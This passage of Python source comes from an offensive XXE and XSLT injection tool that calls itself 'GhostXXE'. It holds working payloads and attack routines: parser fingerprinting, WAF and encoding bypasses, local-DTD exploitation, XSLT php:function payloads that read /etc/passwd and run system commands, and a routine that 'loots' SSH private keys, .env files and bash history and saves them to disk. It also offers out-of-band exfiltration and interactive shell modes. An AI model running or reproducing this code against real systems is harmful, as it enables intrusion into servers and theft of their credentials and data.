        if results.get('vulnerabilities'):
            for v in results['vulnerabilities']:
                vuln_types.append(v['type'])
        
        if results['processes_entities'] or results.get('severity') in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            if 'XXE' not in vuln_types:
                vuln_types.insert(0, 'XXE')
        
        vuln_types_str = ', '.join(vuln_types) if vuln_types else 'None'
        
        # Severity Badge
        severity_colors = {
            'CRITICAL': Colors.ERROR,
            'HIGH': Colors.WARNING,
            'MEDIUM': Colors.INFO,
            'LOW': Colors.INFO,
            'NONE': Colors.RESET
        }
        
        severity_color = severity_colors.get(results['severity'], Colors.RESET)
        
        print(f"{Colors.HEADER}╔════════════════════════════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.HEADER}║ VULNERABILITY STATUS                                       ║{Colors.RESET}")
        print(f"{Colors.HEADER}╚════════════════════════════════════════════════════════════╝{Colors.RESET}")
        
        vuln_status = "VULNERABLE" if results['vulnerable'] else "NOT VULNERABLE"
        status_color = Colors.ERROR if results['vulnerable'] else Colors.SUCCESS
        
        print(f"\n{status_color}Status: {vuln_status}{Colors.RESET}")
        if vuln_types:
            print(f"{Colors.WARNING}Vulnerability Types: {vuln_types_str}{Colors.RESET}")
        print(f"{severity_color}Severity: {results['severity']}{Colors.RESET}")
        print(f"{Colors.INFO}Confidence: {results['confidence']}{Colors.RESET}\n")
        
        # Findings
        if results['findings']:
            print(f"{Colors.HEADER}╔════════════════════════════════════════════════════════════╗{Colors.RESET}")
            print(f"{Colors.HEADER}║ FINDINGS                                                   ║{Colors.RESET}")
            print(f"{Colors.HEADER}╚════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
            
            for idx, finding in enumerate(results['findings'], 1):
                print(f"{Colors.SUCCESS}[{idx}] {finding}{Colors.RESET}")
            print()
        
        # Next Steps
        if results['next_steps']:
            print(f"{Colors.HEADER}╔════════════════════════════════════════════════════════════╗{Colors.RESET}")
            print(f"{Colors.HEADER}║ RECOMMENDED NEXT STEPS                                     ║{Colors.RESET}")
            print(f"{Colors.HEADER}╚════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
            
            for idx, step in enumerate(results['next_steps'], 1):
                print(f"{Colors.WARNING}[{idx}] {step}{Colors.RESET}")
            print()
        
        # Exploitation Commands
        if results['vulnerable']:
            print(f"{Colors.HEADER}╔════════════════════════════════════════════════════════════╗{Colors.RESET}")
            print(f"{Colors.HEADER}║ EXPLOITATION COMMANDS                                      ║{Colors.RESET}")
            print(f"{Colors.HEADER}╚════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
            
            # Check if XSLT vulnerability was found
            xslt_found = any('XSLT' in v.get('type', '') for v in results.get('vulnerabilities', []))
            xslt_php_found = any('XSLT PHP functions' in str(results.get('findings', [])))
            
            if xslt_found:
                print(f"{Colors.ERROR}[!] XSLT INJECTION DETECTED - Use these commands:{Colors.RESET}\n")
                
                if xslt_php_found:
                    print(f"{Colors.SUCCESS}1. Test Local File Inclusion (LFI):{Colors.RESET}")
                    print(f"   Manual payload to inject in parameter:")
                    lfi_payload = '<xsl:value-of select="php:function(\'file_get_contents\',\'/etc/passwd\')" xmlns:php="http://php.net/xsl" />'
                    print(f"   {lfi_payload}\n")
                    
                    # Show URL-encoded version for GET
                    if self.method == 'GET' and self.param:
                        from urllib.parse import quote
                        encoded_lfi = quote(lfi_payload)
                        print(f"{Colors.INFO}   URL-Encoded (for browser/GET):{Colors.RESET}")
                        print(f"   {self.target_url}?{self.param}={encoded_lfi}\n")
                    
                    print(f"{Colors.SUCCESS}2. Test Remote Code Execution (RCE):{Colors.RESET}")
                    print(f"   Manual payload to execute 'id' command:")
                    rce_payload = '<xsl:value-of select="php:function(\'system\',\'id\')" xmlns:php="http://php.net/xsl" />'
                    print(f"   {rce_payload}\n")
                    
                    # Show URL-encoded version for GET
                    if self.method == 'GET' and self.param:
                        encoded_rce = quote(rce_payload)
                        print(f"{Colors.INFO}   URL-Encoded (for browser/GET):{Colors.RESET}")
                        print(f"   {self.target_url}?{self.param}={encoded_rce}\n")
                    
                    print(f"{Colors.SUCCESS}3. Read sensitive files:{Colors.RESET}")
                    hostname_payload = '<xsl:value-of select="php:function(\'file_get_contents\',\'/etc/hostname\')" xmlns:php="http://php.net/xsl" />'
                    config_payload = '<xsl:value-of select="php:function(\'file_get_contents\',\'config.php\')" xmlns:php="http://php.net/xsl" />'
                    print(f"   {hostname_payload}")
                    print(f"   {config_payload}\n")
                    
                    print(f"{Colors.SUCCESS}4. Test through tool (automated):{Colors.RESET}")
                    print(f"   python3 ghostxxxe.py -u {self.target_url} -p {self.param if self.param else 'PARAM'} \\")
                    print(f"       -m {self.method} --advanced -v\n")
                    
                    print(f"{Colors.SUCCESS}5. With Burp Suite proxy:{Colors.RESET}")
                    print(f"   python3 ghostxxxe.py -u {self.target_url} -p {self.param if self.param else 'PARAM'} \\")
                    print(f"       -m {self.method} --proxy http://127.0.0.1:8080 --advanced -v\n")
                    
                    if self.method == 'GET':
                        print(f"{Colors.WARNING}   💡 URL encoding is automatic with the tool, but shown above for manual testing{Colors.RESET}\n")
                    else:
                        print(f"{Colors.WARNING}   💡 For GET requests, use -m GET and the tool will URL-encode automatically{Colors.RESET}\n")
                else:
                    print(f"{Colors.SUCCESS}1. Test XSLT version detection:{Colors.RESET}")
                    print(f'''   <xsl:value-of select="system-property('xsl:version')" />
''')
                    
                    print(f"{Colors.SUCCESS}2. Comprehensive testing:{Colors.RESET}")
                    print(f"   python3 ghostxxxe.py -u {self.target_url} -p {self.param if self.param else 'PARAM'} \\")
                    print(f"       -m {self.method} --advanced -v\n")
            
            if results['severity'] in ['CRITICAL', 'HIGH'] and not xslt_found:
                print(f"{Colors.SUCCESS}1. Full Exploitation Scan:{Colors.RESET}")
                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} -v\n")
                
                print(f"{Colors.SUCCESS}2. Read Sensitive Files:{Colors.RESET}")
                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} -f /etc/passwd -v\n")
                
                print(f"{Colors.SUCCESS}3. Extract Source Code:{Colors.RESET}")
                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} -f config.php -v\n")
                
                print(f"{Colors.SUCCESS}4. Out-of-Band Exploitation:{Colors.RESET}")
                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
                print(f"     --oob --callback-ip YOUR_IP --callback-port 8080 -v\n")
                
                print(f"{Colors.SUCCESS}5. Interactive Shell:{Colors.RESET}")
                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} --interactive\n")
                
                print(f"{Colors.SUCCESS}6. Through Burp Suite:{Colors.RESET}")
                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
                print(f"     --proxy http://127.0.0.1:8080 -v\n")
        
        print(f"{Colors.HEADER}{'='*70}{Colors.RESET}\n")
        
        # Save to vulnerabilities list for summary
        if results['vulnerable']:
            self.vulnerabilities_found.append({
                'type': f'XXE Vulnerability - {results["severity"]}',
                'payload': 'Discovery Scan',
                'severity': results['severity'],
                'confidence': results['confidence'],
                'findings': results['findings']
            })
    
    # ==================================================================
    # Phase 0: Enumeration -- parser, content types, endpoints, protocols
    # ==================================================================

    PARSER_SIGNATURES = [
        ('libxml', 'libxml2 (PHP/Python lxml)'),
        ('simplexml', 'SimpleXML (PHP)'),
        ('domdocument', 'DOMDocument (PHP)'),
        ('org.xml.sax', 'SAX/Xerces (Java)'),
        ('saxparseexception', 'SAX/Xerces (Java)'),
        ('javax.xml', 'JAXP (Java)'),
        ('com.sun.org.apache.xerces', 'Xerces (Java internal)'),
        ('system.xml', 'System.Xml (.NET)'),
        ('xmlexception', 'System.Xml (.NET)'),
        ('expat', 'expat (C/Python)'),
        ('xml.etree', 'ElementTree (Python)'),
        ('nokogiri', 'Nokogiri (Ruby)'),
        ('rexml', 'REXML (Ruby)'),
        ('sax-js', 'sax-js (Node.js)'),
        ('libxmljs', 'libxmljs (Node.js)'),
        ('msxml', 'MSXML (Windows)'),
    ]

    DTD_BLOCKED_SIGNATURES = [
        'doctype is disallowed', 'dtd is prohibited', 'dtd processing is not allowed',
        'disallow-doctype-decl', 'entity references are not allowed',
        'external entity', 'entity_loader', 'xxe',
    ]

    XML_ENDPOINT_CANDIDATES = [
        '/xmlrpc.php', '/xmlrpc', '/RPC2', '/soap', '/soap/', '/api/soap',
        '/ws', '/ws/', '/services', '/services/', '/service.asmx',
        '/api/xml', '/xml', '/feed', '/rss', '/sitemap.xml',
        '/wsdl', '/?wsdl', '/soap?wsdl', '/services?wsdl',
        '/saml/SSO', '/saml/acs', '/sso/saml', '/Shibboleth.sso/SAML2/POST',
        '/cgi-bin/xml', '/api/import', '/import', '/upload/xml',
    ]

    def fingerprint_parser(self):
        """Identify the backend XML parser from error messages, and check
        whether DTD/entity processing is blocked outright. Knowing the
        parser decides which payload families are worth firing."""
        print(f"\n{Colors.HEADER}[*] Phase 0a: XML Parser Fingerprinting{Colors.RESET}")

        probes = [
            ('Malformed XML', '<?xml version="1.0"?><r><unclosed></r>'),
            ('Bad entity ref', '<?xml version="1.0"?><r>&undefined_entity;</r>'),
            ('DOCTYPE probe', '<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY g "ghost"> ]><r>&g;</r>'),
        ]

        dtd_blocked = False
        for name, probe in probes:
            response = self.send_payload(probe, f"Fingerprint - {name}")
            if not response:
                continue
            text_lower = response.text.lower()
            for signature, parser in self.PARSER_SIGNATURES:
                if signature in text_lower:
                    self.parser_fingerprint = parser
                    print(f"{Colors.SUCCESS}[+] Parser identified: {parser} "
                          f"(via '{signature}' in {name} response){Colors.RESET}")
                    break
            if name == 'DOCTYPE probe':
                if any(sig in text_lower for sig in self.DTD_BLOCKED_SIGNATURES):
                    dtd_blocked = True
                    print(f"{Colors.WARNING}[!] Parser reports DTD/entity processing BLOCKED "
                          f"-- encoding bypasses and XInclude are the best remaining angles{Colors.RESET}")
            if self.parser_fingerprint:
                break

        if not self.parser_fingerprint:
            print(f"{Colors.INFO}[*] Parser not identifiable from errors (errors may be suppressed){Colors.RESET}")
        else:
            hints = {
                'PHP': 'php://filter + expect:// payloads prioritized',
                'Java': 'jar:/netdoc:/gopher: + FTP OOB payloads prioritized',
                '.NET': 'local DTD (cim20.dtd) + PUBLIC identifier payloads prioritized',
                'Python': 'billion-laughs hardened? ElementTree ignores DTD by default',
            }
            for family, hint in hints.items():
                if family in self.parser_fingerprint:
                    print(f"{Colors.INFO}[*] Strategy: {hint}{Colors.RESET}")
        return dtd_blocked

    def enumerate_content_types(self):
        """Find every Content-Type under which the endpoint still parses XML
        -- including JSON endpoints that transparently convert (Content-Type
        coercion is the #1 way XXE hides in modern REST APIs)."""
        print(f"\n{Colors.HEADER}[*] Phase 0b: Content-Type Acceptance Matrix{Colors.RESET}")

        marker = 'GHOST_CT_PROBE'
        probe = f'<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY g "{marker}"> ]><r>&g;</r>'
        candidates = [
            'application/xml', 'text/xml', 'application/soap+xml',
            'application/xhtml+xml', 'application/rss+xml', 'image/svg+xml',
            'application/xml;charset=UTF-8', 'text/plain', 'application/json',
        ]

        for content_type in candidates:
            response = self.send_payload(probe, f"Content-Type: {content_type}", content_type=content_type)
            if not response:
                continue
            if marker in response.text:
                self.accepted_content_types.append(content_type)
                print(f"{Colors.SUCCESS}[+] XML PARSED as {content_type} (entity substituted!){Colors.RESET}")
            elif response.status_code < 415 and response.status_code != 400:
                print(f"{Colors.INFO}[*] Accepted (no reflection) as {content_type} "
                      f"[HTTP {response.status_code}]{Colors.RESET}")
            elif self.verbose:
                print(f"{Colors.WARNING}[-] Rejected as {content_type} [HTTP {response.status_code}]{Colors.RESET}")

        if 'application/json' in self.accepted_content_types:
            print(f"{Colors.ERROR}[!] CRITICAL SURFACE: JSON endpoint parses XML "
                  f"(content-type coercion) -- classic hidden XXE{Colors.RESET}")
            self.vulnerabilities_found.append({
                'type': 'Content-Type Coercion (JSON endpoint parses XML)',
                'severity': 'HIGH',
                'evidence': f'Entity value {marker} substituted with Content-Type: application/json',
                'payload': probe,
            })

    def enumerate_xml_endpoints(self):
        """Sweep the target host for other XML-consuming endpoints (SOAP,
        XML-RPC, SAML, feeds) worth pointing this tool at next."""
        print(f"\n{Colors.HEADER}[*] Phase 0c: XML Endpoint Discovery (host-wide){Colors.RESET}")
        parsed = urlparse(self.target_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        probe = '<?xml version="1.0"?><r>ghost</r>'
        found = []

        for path in self.XML_ENDPOINT_CANDIDATES:
            url = base + path
            try:
                response = self.session.post(url, data=probe,
                                             headers={**self.headers, 'Content-Type': 'text/xml'},
                                             cookies=self.cookies, timeout=self.timeout,
                                             proxies=self.proxy, verify=False)
                text_lower = response.text[:2000].lower()
                xmlish = ('xml' in response.headers.get('Content-Type', '').lower()
                          or 'soap' in text_lower or 'faultcode' in text_lower
                          or 'methodresponse' in text_lower or '<?xml' in text_lower)
                if response.status_code in (200, 405, 500) and xmlish:
                    found.append((path, response.status_code))
                    print(f"{Colors.SUCCESS}[+] XML-speaking endpoint: {path} [HTTP {response.status_code}]{Colors.RESET}")
            except requests.exceptions.RequestException:
                pass

        if found:
            print(f"{Colors.INFO}[*] {len(found)} additional XML endpoints -- rerun with -u {base}<path>{Colors.RESET}")
        else:
            print(f"{Colors.INFO}[*] No additional XML endpoints found on host{Colors.RESET}")
        return found

    def enumerate_protocol_support(self):
        """Build a URL-scheme support matrix. Each supported scheme unlocks
        a different exploitation path (php:// = binary-safe read, expect://
        = RCE, jar:/gopher: = Java SSRF pivots, etc.)."""
        print(f"\n{Colors.HEADER}[*] Phase 0d: Protocol/Scheme Support Enumeration{Colors.RESET}")

        # Control: an unsupported garbage scheme, to learn the "unsupported"
        # error shape so real schemes can be diffed against it.
        control = self.send_payload(PayloadGenerator.scheme_probe('ghostproto://x/y'),
                                    'Protocol control (bogus scheme)')
        control_sig = (control.status_code, len(control.text)) if control else None

        for name, url, meaning in PayloadGenerator.PROTOCOL_PROBES:
            response = self.send_payload(PayloadGenerator.scheme_probe(url), f'Protocol probe: {name}')
            if not response:
                continue
            if 'GHOST_DATA_OK' in response.text:
                verdict = 'CONFIRMED (data echoed)'
            elif control_sig and (response.status_code, len(response.text)) != control_sig:
                verdict = 'likely supported (differs from bogus-scheme control)'
            else:
                verdict = None
            if verdict:
                self.supported_protocols.append(name)
                print(f"{Colors.SUCCESS}[+] {name:<12} {verdict}  -> {meaning}{Colors.RESET}")
            elif self.verbose:
                print(f"{Colors.WARNING}[-] {name:<12} no support indication{Colors.RESET}")

        if 'expect' in self.supported_protocols:
            print(f"{Colors.ERROR}[!] expect:// reachable -- direct RCE candidate "
                  f"(--interactive mode){Colors.RESET}")

    # ==================================================================
    # Advanced detection batteries
    # ==================================================================

    def detect_xxe_encoding_bypass(self) -> bool:
        """UTF-16LE/BE and UTF-7 byte-level payloads -- these sail past WAFs
        and app-layer filters that regex-scan for ASCII '<!DOCTYPE'."""
        print(f"\n{Colors.HEADER}[*] Phase: Encoding-Bypass XXE Battery (UTF-16/UTF-7){Colors.RESET}")
        found = False

        attempts = [
            ('UTF-16LE bytes', PayloadGenerator.xxe_utf16_bytes(self.file_path, 'le'),
             'application/xml;charset=UTF-16'),
            ('UTF-16BE bytes', PayloadGenerator.xxe_utf16_bytes(self.file_path, 'be'),
             'application/xml;charset=UTF-16'),
            ('UTF-7 declared', PayloadGenerator.xxe_utf7_encoded(self.file_path), None),
        ]
        for name, payload, content_type in attempts:
            response = self.send_payload(payload, f'Encoding bypass - {name}', content_type=content_type)
            if response and self._check_xxe_response(response, self.file_path):
                print(f"{Colors.ERROR}[!] XXE via {name} -- filter/WAF bypassed{Colors.RESET}")
                self.vulnerabilities_found.append({
                    'type': f'XXE via encoding bypass ({name})',
                    'severity': 'CRITICAL',
                    'evidence': f'{self.file_path} content returned using {name} payload',
                    'payload': payload if isinstance(payload, str) else f'<{len(payload)} raw bytes>',
                })
                found = True
        if not found:
            print(f"{Colors.INFO}[*] No encoding-bypass hits{Colors.RESET}")
        return found

    def detect_xxe_waf_bypass(self) -> bool:
        """DOCTYPE mutation battery: parameter-entity indirection, PUBLIC
        identifiers, whitespace/comment mutations, nested entity hops."""
        print(f"\n{Colors.HEADER}[*] Phase: WAF/Filter Bypass DOCTYPE Battery{Colors.RESET}")
        found = False
        for name, payload in PayloadGenerator.xxe_waf_bypass_variants(self.file_path):
            response = self.send_payload(payload, f'WAF bypass - {name}')
            if response and self._check_xxe_response(response, self.file_path):
                print(f"{Colors.ERROR}[!] XXE via DOCTYPE mutation: {name}{Colors.RESET}")
                self.vulnerabilities_found.append({
                    'type': f'XXE via DOCTYPE mutation ({name})',
                    'severity': 'CRITICAL',
                    'evidence': f'{self.file_path} content returned',
                    'payload': payload,
                })
                self.working_read_template = payload.replace(self.file_path, '{FILE}')
                found = True
        if not found:
            print(f"{Colors.INFO}[*] No DOCTYPE-mutation hits{Colors.RESET}")
        return found

    def enumerate_local_dtds(self) -> list:
        """Probe for local DTD files on the target (existence oracle via
        error deltas), then attempt the parameter-entity-redefinition
        exploit against each one found. Works fully offline -- the go-to
        technique when outbound traffic is firewalled."""
        print(f"\n{Colors.HEADER}[*] Phase: Local DTD Enumeration & Exploitation{Colors.RESET}")

        # Error shape for a path we KNOW doesn't exist
        control = self.send_payload(
            PayloadGenerator.local_dtd_existence_probe('/ghostops/definitely/missing.dtd'),
            'Local DTD control (missing path)')
        control_sig = (control.status_code, len(control.text)) if control else None

        present = []
        for dtd_path, entity_name, os_hint in PayloadGenerator.LOCAL_DTD_CANDIDATES:
            response = self.send_payload(PayloadGenerator.local_dtd_existence_probe(dtd_path),
                                         f'Local DTD probe: {dtd_path}')
            if not response or not control_sig:
                continue
            if (response.status_code, len(response.text)) != control_sig:
                present.append((dtd_path, entity_name, os_hint))
                print(f"{Colors.SUCCESS}[+] Local DTD exists: {dtd_path}  [{os_hint}]{Colors.RESET}")

        for dtd_path, entity_name, os_hint in present:
            if not entity_name:
                continue
            payload = PayloadGenerator.local_dtd_exploit(dtd_path, entity_name, self.file_path)
            response = self.send_payload(payload, f'Local DTD exploit via {dtd_path}')
            if response and self._check_xxe_response(response, self.file_path):
                print(f"{Colors.ERROR}[!] LOCAL DTD XXE CONFIRMED via {dtd_path}{Colors.RESET}")
                self.vulnerabilities_found.append({
                    'type': 'XXE via local DTD parameter-entity redefinition',
                    'severity': 'CRITICAL',
                    'evidence': f'{self.file_path} disclosed via {dtd_path} ({os_hint})',
                    'payload': payload,
                })
                self.working_read_template = payload.replace(self.file_path, '{FILE}')

        if not present:
            print(f"{Colors.INFO}[*] No known local DTDs detected{Colors.RESET}")
        return present

    # ==================================================================
    # Post-confirmation exploitation: reflection calibration + harvesting
    # ==================================================================

    HARVEST_FILES_LINUX = [
        '/etc/passwd', '/etc/hosts', '/etc/hostname', '/etc/issue',
        '/etc/os-release', '/proc/version', '/proc/self/environ',
        '/proc/self/cmdline', '/proc/net/tcp', '/etc/ssh/sshd_config',
        '/root/.ssh/id_rsa', '/root/.bash_history',
        '/var/www/html/.env', '/var/www/.env', '/etc/mysql/my.cnf',
        '/etc/nginx/nginx.conf', '/etc/apache2/apache2.conf',
    ]
    HARVEST_FILES_WINDOWS = [
        'C:/Windows/win.ini', 'C:/Windows/System32/drivers/etc/hosts',
    ]

    def _calibrate_reflection(self) -> bool:
        """Learn the exact prefix/suffix around reflected entity values so
        harvested file contents can be carved out of responses cleanly."""
        marker = 'GHOSTCAL7739'
        response = self.send_payload(PayloadGenerator.reflection_calibrator(marker),
                                     'Reflection calibration')
        if not response or marker not in response.text:
            return False
        text = response.text
        idx = text.find(marker)
        prefix = text[max(0, idx - 40):idx]
        suffix = text[idx + len(marker):idx + len(marker) + 40]
        self.reflection_bounds = (prefix[-20:], suffix[:20])
        if self.verbose:
            print(f"{Colors.INFO}[*] Reflection bounds locked: "
                  f"...{self.reflection_bounds[0]!r} <DATA> {self.reflection_bounds[1]!r}...{Colors.RESET}")
        return True

    def _carve_reflected(self, text: str) -> Optional[str]:
        """Extract entity-substituted content using calibrated bounds."""
        if not self.reflection_bounds:
            return None
        prefix, suffix = self.reflection_bounds
        start = text.find(prefix)
        if start == -1:
            return None
        start += len(prefix)
        end = text.find(suffix, start) if suffix else -1
        return text[start:end] if end != -1 else text[start:start + 10000]

    def harvest_files(self):
        """Systematically loot high-value files through the confirmed XXE
        vector. Parses /etc/passwd to target real users' SSH keys, tries
        php://filter for binary-safe reads, and saves everything to disk."""
        print(f"\n{Colors.HEADER}[*] Phase: File Harvesting via Confirmed XXE{Colors.RESET}")

        calibrated = self._calibrate_reflection()
        if not calibrated:
            print(f"{Colors.WARNING}[!] No reflection channel -- harvest via OOB instead (--oob){Colors.RESET}")

        template = self.working_read_template or (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE r [ <!ENTITY x SYSTEM "file://{FILE}"> ]>\n'
            '<r>&x;</r>')

        targets = list(self.HARVEST_FILES_LINUX) + list(self.HARVEST_FILES_WINDOWS)
        php_filter = 'php-filter' in self.supported_protocols or (
            self.parser_fingerprint and 'PHP' in self.parser_fingerprint)

        for file_path in targets:
            content = self._read_file_via_xxe(file_path, template, use_php_filter=php_filter)
            if content:
                self.harvested_loot[file_path] = content
                preview = content.strip().splitlines()[0][:80] if content.strip() else ''
                print(f"{Colors.SUCCESS}[+] LOOTED {file_path} ({len(content)} bytes)  {preview}{Colors.RESET}")

                # Pivot: mine /etc/passwd for real home dirs -> SSH keys
                if file_path == '/etc/passwd':
                    for extra in self._passwd_pivot_targets(content):
                        extra_content = self._read_file_via_xxe(extra, template, use_php_filter=php_filter)
                        if extra_content:
                            self.harvested_loot[extra] = extra_content
                            print(f"{Colors.ERROR}[!] LOOTED (pivot) {extra} ({len(extra_content)} bytes){Colors.RESET}")

        if self.harvested_loot:
            self._save_loot()
        else:
            print(f"{Colors.INFO}[*] No files harvested via in-band channel{Colors.RESET}")

    def _read_file_via_xxe(self, file_path: str, template: str, use_php_filter: bool = False) -> Optional[str]:
        """Attempt one file read: direct entity first, php://filter fallback."""
        response = self.send_payload(template.replace('{FILE}', file_path),
                                     f'Harvest: {file_path}')
        if response:
            carved = self._carve_reflected(response.text)
            if carved and carved.strip() and 'GHOSTCAL' not in carved:
                return carved
        if use_php_filter:
            payload = template.replace(
                'file://{FILE}',
                f'php://filter/convert.base64-encode/resource={file_path}'
            ).replace('{FILE}', file_path)
            response = self.send_payload(payload, f'Harvest (php://filter): {file_path}')
            if response:
                carved = self._carve_reflected(response.text)
                if carved:
                    blob = re.search(r'[A-Za-z0-9+/=]{16,}', carved)
                    if blob:
                        try:
                            return base64.b64decode(blob.group(0)).decode('utf-8', errors='replace')
                        except Exception:
                            pass
        return None

    @staticmethod
    def _passwd_pivot_targets(passwd_content: str) -> list:
        """Derive follow-up loot paths from /etc/passwd home directories."""
        targets = []
        for line in passwd_content.splitlines():
            parts = line.split(':')
            if len(parts) >= 7 and parts[5].startswith('/home/') and 'sh' in parts[6]:
                home = parts[5]
                targets.extend([f'{home}/.ssh/id_rsa', f'{home}/.ssh/authorized_keys',
                                f'{home}/.bash_history'])
        return targets[:12]

    def _save_loot(self):
        """Write harvested files to the loot directory."""
        host = urlparse(self.target_url).netloc.replace(':', '_')
        loot_path = os.path.join(self.loot_dir, host)
        os.makedirs(loot_path, exist_ok=True)
        for file_path, content in self.harvested_loot.items():
            safe_name = file_path.replace('\\', '/').strip('/').replace('/', '_').replace(':', '')
            with open(os.path.join(loot_path, safe_name), 'w') as f:
                f.write(content)
        print(f"\n{Colors.SUCCESS}[+] {len(self.harvested_loot)} files saved to {loot_path}/{Colors.RESET}")

    def run_scan(self, include_advanced=False):
        """Run complete XXE scan"""
        print(f"\n{Colors.HEADER}[*] Starting GhostXXE Comprehensive Scan{Colors.RESET}")
        print(f"{Colors.INFO}[*] Target: {self.target_url}{Colors.RESET}")
        print(f"{Colors.INFO}[*] Method: {self.method}{Colors.RESET}")

        # Phase 0: Enumeration -- parser, content types, protocols, endpoints
        try:
            self.fingerprint_parser()
            self.enumerate_content_types()
            self.enumerate_protocol_support()
            if self.enum_endpoints:
                self.enumerate_xml_endpoints()
        except Exception as e:
            print(f"{Colors.ERROR}[-] Enumeration phase error: {str(e)}{Colors.RESET}")
            if self.verbose:
                import traceback
                traceback.print_exc()

        # Phase 1: Test entity injection (confirms XXE)
        entity_vuln = self.detect_xxe_entity_injection()

        # If entity injection works, proceed with file read tests
        if entity_vuln:
            print(f"\n{Colors.SUCCESS}[+] XXE CONFIRMED - Proceeding with exploitation tests{Colors.RESET}")
        else:
            print(f"\n{Colors.WARNING}[!] Entity injection not working - trying alternative methods{Colors.RESET}")

        # Run basic detection tests
        basic_tests = [
            self.detect_xxe_basic,
            self.detect_xxe_error_based,
            self.detect_xxe_local_dtd,
            self.detect_xinclude,
            self.test_xslt_injection,
            self.test_xpath_injection,
            self.detect_xxe_waf_bypass,
            self.detect_xxe_encoding_bypass,
        ]

        # Advanced tests: local DTD enumeration battery + repeat XSLT pass
        advanced_tests = []
        if include_advanced:
            print(f"{Colors.INFO}[*] Advanced mode: local DTD enumeration + extended XSLT tests{Colors.RESET}")
            advanced_tests = [self.enumerate_local_dtds, self.test_xslt_injection]

        all_tests = basic_tests + advanced_tests

        print(f"{Colors.INFO}[*] Running {len(basic_tests)} detection batteries"
              + (f" + {len(advanced_tests)} advanced" if advanced_tests else "")
              + f"{Colors.RESET}")

        for test in all_tests:
            try:
                test()
                time.sleep(1)  # Avoid overwhelming target
            except Exception as e:
                print(f"{Colors.ERROR}[-] Test failed: {str(e)}{Colors.RESET}")
                if self.verbose:
                    import traceback
                    traceback.print_exc()

        # Phase 5: File harvesting through whatever vector was confirmed
        if self.harvest:
            try:
                self.harvest_files()
            except Exception as e:
                print(f"{Colors.ERROR}[-] Harvest phase error: {str(e)}{Colors.RESET}")
        elif self.vulnerabilities_found:
            print(f"\n{Colors.INFO}[*] Tip: rerun with --harvest to loot high-value files "
                  f"through the confirmed vector{Colors.RESET}")

        # Print summary
        self._print_summary()
    
    def _print_summary(self):
        """Print scan summary with actionable exploitation commands"""
        print(f"\n{Colors.HEADER}{'='*70}{Colors.RESET}")
        print(f"{Colors.HEADER}[*] Scan Complete - Summary{Colors.RESET}")
        print(f"{Colors.HEADER}{'='*70}{Colors.RESET}\n")
        
        if self.vulnerabilities_found:
            print(f"{Colors.SUCCESS}[+] Found {len(self.vulnerabilities_found)} vulnerabilities:{Colors.RESET}\n")
            
            # Categorize vulnerabilities
            xxe_vulns = []
            xslt_file_read = []
            xslt_rce = []
            xpath_vulns = []
            
            for vuln in self.vulnerabilities_found:
                vuln_type = vuln.get('type', '')
                if 'XSLT' in vuln_type and ('RCE' in vuln_type or 'PHP' in vuln_type or '.NET' in vuln_type):
                    xslt_rce.append(vuln)
                elif 'XSLT' in vuln_type:
                    xslt_file_read.append(vuln)
                elif 'XPATH' in vuln_type:
                    xpath_vulns.append(vuln)
                else:
                    xxe_vulns.append(vuln)
            
            # Print vulnerability list
            for idx, vuln in enumerate(self.vulnerabilities_found, 1):
                print(f"{Colors.INFO}[{idx}] {vuln['type']}{Colors.RESET}")
                if 'file' in vuln:
                    print(f"    File: {vuln['file']}")
                if 'test_value' in vuln:
                    print(f"    Test Value: {vuln['test_value']}")
                if 'method' in vuln:
                    print(f"    Method: {vuln['method']}")
                print(f"    Payload Preview: {vuln['payload'][:100]}...")
                print()
            
            # Provide SPECIFIC exploitation commands based on findings
            print(f"\n{Colors.HEADER}{'='*70}{Colors.RESET}")
            print(f"{Colors.ERROR}[!] EXPLOITATION COMMANDS - VALIDATE FINDINGS{Colors.RESET}")
            print(f"{Colors.HEADER}{'='*70}{Colors.RESET}\n")
            
            # XXE Exploitation Commands
            if xxe_vulns:
                print(f"{Colors.SUCCESS}╔═══════════════════════════════════════════════════════════════╗{Colors.RESET}")
                print(f"{Colors.SUCCESS}║ XXE (XML External Entity) EXPLOITATION                       ║{Colors.RESET}")
                print(f"{Colors.SUCCESS}╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
                
                print(f"{Colors.WARNING}→ Test File Read (Linux):{Colors.RESET}")
                print(f"   # Read /etc/passwd")
                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
                print(f"       -f /etc/passwd -v\n")
                
                print(f"   # Read /etc/hostname")
                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
                print(f"       -f /etc/hostname -v\n")
                
                print(f"{Colors.WARNING}→ Read Application Files:{Colors.RESET}")
                print(f"   # PHP config files")
                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
                print(f"       -f /var/www/html/config.php -v\n")
                
                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
                print(f"       -f index.php -v\n")
                
                print(f"{Colors.WARNING}→ Out-of-Band (OOB) Exfiltration:{Colors.RESET}")
                print(f"   # For blind XXE")
                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
                print(f"       --oob --callback-ip YOUR_IP -v\n")
                
                print(f"{Colors.WARNING}→ Interactive Mode:{Colors.RESET}")
                print(f"   # Test multiple files interactively")
                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
                print(f"       --interactive\n")
            
            # XSLT File Read Commands
            if xslt_file_read:
                print(f"{Colors.SUCCESS}╔═══════════════════════════════════════════════════════════════╗{Colors.RESET}")
                print(f"{Colors.SUCCESS}║ XSLT INJECTION - LOCAL FILE INCLUSION (LFI)                  ║{Colors.RESET}")
